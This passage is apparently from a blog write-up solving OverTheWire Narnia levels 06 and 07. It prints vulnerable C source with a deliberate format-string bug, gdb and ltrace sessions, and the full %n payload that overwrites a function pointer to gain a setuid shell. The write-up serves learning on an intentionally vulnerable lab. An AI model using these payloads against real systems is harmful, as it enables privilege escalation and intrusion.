&lt;li&gt;Assemble payload and hopefully get a shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the last step:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ /games/narnia/narnia6 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;a&amp;#39;*8 + &amp;#39;\xd0\x2c\xe6\xf7&amp;#39; +&amp;#39; &amp;#39;+ &amp;#39;b&amp;#39;*8 + &amp;#39;/bin/sh&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-07:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;vuln&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;format){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf)();&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(buffer,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;goodfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hackedfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hackedfunction);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;before : ptrf() = %p (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I guess you want to come to the hackedfunction...&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sleep(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;format);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf();&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;fprintf(stderr,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s &amp;lt;buffer&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(vuln(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]));&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Welcome to the goodfunction, but i said the Hackedfunction..&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Way to go!!!!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The presence of &lt;code&gt;snprintf&lt;/code&gt; indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&amp;rsquo;s attack this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &amp;lt;+0&amp;gt;:	push   %ebp
   0x080485ce &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x080485d0 &amp;lt;+3&amp;gt;:	sub    $0xa8,%esp
   0x080485d6 &amp;lt;+9&amp;gt;:	movl   $0x80,0x8(%esp)
   0x080485de &amp;lt;+17&amp;gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &amp;lt;+25&amp;gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &amp;lt;+31&amp;gt;:	mov    %eax,(%esp)
   0x080485ef &amp;lt;+34&amp;gt;:	call   0x80484b0 &amp;lt;memset@plt&amp;gt;
   0x080485f4 &amp;lt;+39&amp;gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &amp;lt;+47&amp;gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &amp;lt;+54&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048608 &amp;lt;+59&amp;gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &amp;lt;+67&amp;gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &amp;lt;+74&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x0804861c &amp;lt;+79&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &amp;lt;+89&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &amp;lt;+95&amp;gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &amp;lt;+101&amp;gt;:	mov    %edx,0x8(%esp)
   0x08048636 &amp;lt;+105&amp;gt;:	mov    %eax,0x4(%esp)
   0x0804863a &amp;lt;+109&amp;gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &amp;lt;+116&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048646 &amp;lt;+121&amp;gt;:	movl   $0x8048818,(%esp)
   0x0804864d &amp;lt;+128&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x08048652 &amp;lt;+133&amp;gt;:	movl   $0x2,(%esp)
   0x08048659 &amp;lt;+140&amp;gt;:	call   0x8048440 &amp;lt;sleep@plt&amp;gt;
   0x0804865e &amp;lt;+145&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &amp;lt;+155&amp;gt;:	mov    0x8(%ebp),%eax
   0x0804866b &amp;lt;+158&amp;gt;:	mov    %eax,0x8(%esp)
   0x0804866f &amp;lt;+162&amp;gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &amp;lt;+170&amp;gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &amp;lt;+176&amp;gt;:	mov    %eax,(%esp)
   0x08048680 &amp;lt;+179&amp;gt;:	call   0x80484c0 &amp;lt;snprintf@plt&amp;gt;
   0x08048685 &amp;lt;+184&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &amp;lt;+190&amp;gt;:	call   *%eax
   0x0804868d &amp;lt;+192&amp;gt;:	leave  
   0x0804868e &amp;lt;+193&amp;gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So disassmble the &lt;code&gt;vuln&lt;/code&gt; function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of &lt;code&gt;%x&lt;/code&gt; you need. Using
&lt;code&gt;ltrace&lt;/code&gt; it&amp;rsquo;s possible to increment the number of &lt;code&gt;%x&lt;/code&gt;&amp;rsquo;s until you
see your string in the output again. I&amp;rsquo;ll paste only the correcy output here&lt;/p&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ ltrace ./narnia7 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;`&lt;/span&gt;
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &amp;lt;unfinished ...&amp;gt;
memset(0xffffd630, &amp;#39;\0&amp;#39;, 128)                                = 0xffffd630
printf(&amp;quot;goodfunction() = %p\n&amp;quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&amp;quot;hackedfunction() = %p\n\n&amp;quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&amp;quot;before : ptrf() = %p (%p)\n&amp;quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&amp;quot;I guess you want to come to the &amp;quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&amp;quot;aaaabbbb8048238ffffd688f7ffda940&amp;quot;..., 128, &amp;quot;aaaabbbb%x%x%x%x%x%x%x&amp;quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&amp;quot;Welcome to the goodfunction, but&amp;quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &amp;lt;no return ...&amp;gt;
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;You can see the &lt;em&gt;aaaa&lt;/em&gt; and &lt;em&gt;bbbb&lt;/em&gt; at line 14. So we have 7 &lt;code&gt;%x&lt;/code&gt; to get the second value.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at the stack with that input&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So at &lt;code&gt;0xffffd60c&lt;/code&gt; is the address of &lt;code&gt;goodfunction&lt;/code&gt;. We need to overwrite that
to point to &lt;code&gt;0x8048706&lt;/code&gt;, our &lt;code&gt;hackedfunction&lt;/code&gt;. So as before in &lt;a href=&#34;http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05&#34;&gt;level 05&lt;/a&gt;
we use &lt;code&gt;%n&lt;/code&gt; to try and overwrite this value.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The value of &lt;em&gt;2f&lt;/em&gt; at &lt;code&gt;0xffffd60c&lt;/code&gt; shows us that our overwrite was successful
and we wrote the value of &lt;em&gt;47&lt;/em&gt;. We need to write &lt;code&gt;0x8048706&lt;/code&gt; which is &lt;em&gt;134514438&lt;/em&gt; in decimal.
So let&amp;rsquo;s add our &lt;code&gt;%d&lt;/code&gt; in and remember to adjust the number of &lt;code&gt;%x&lt;/code&gt;s too, so we can see
how much padding we need&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, so &lt;code&gt;0x8048706 - 0x00000031 = 0x80486d6&lt;/code&gt; or &lt;em&gt;134514389&lt;/em&gt; in decimal.
Let&amp;rsquo;s see if I&amp;rsquo;m right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Still a little off. Adjusting the value again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And now we need to run it from the commandline to actually get a proper setuid shell&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x1c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
